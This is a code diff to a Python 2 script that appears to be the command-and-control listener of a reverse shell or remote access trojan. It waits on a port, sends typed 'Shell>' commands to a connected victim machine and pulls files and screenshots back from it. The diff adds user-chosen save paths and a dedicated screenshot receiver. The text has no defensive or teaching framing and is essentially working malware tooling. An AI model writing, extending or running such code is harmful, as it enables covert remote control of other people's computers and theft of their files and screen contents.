@@ -7,7 +7,8 @@ Port = 8080 #Change this to your own port
 
 def transfer(conn,command):
     conn.send(command)
-    f = open('D:/test.png','wb')
+    null1, null2, destination = command.split(' ')
+    f = open( destination,'wb')
     while True:
         bits = conn.recv(1024)
         if 'Unable to find out the file' in bits:
@@ -19,6 +20,20 @@ def transfer(conn,command):
             break
         f.write(bits)
 
+def screenshot(conn,command):
+    conn.send(command)
+    null, destination = command.split(' ')
+    f = open( destination,'wb')
+    while True:
+        bits = conn.recv(1024)
+        if 'Unable to find out the file' in bits:
+            print('[-] Unable to find out the file')
+            break
+        if bits.endswith('DONE'):
+            print('[+] Transfer completed ')
+            f.close()
+            break
+        f.write(bits)
 
 def connect():
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #Start a socket objecty s
@@ -32,6 +47,7 @@ def connect():
 
     while True:
         command = raw_input("Shell> ") #Get user input and store it in command veraibloe
+
         if 'terminate' in command:
             conn.send(command)
             conn.close()
@@ -40,7 +56,7 @@ def connect():
             transfer(conn, command)
 
         elif 'screencap' in command:
-            transfer(conn, command)
+            screenshot(conn, command)
 
         else:
             conn.send(command) #send the command to the server
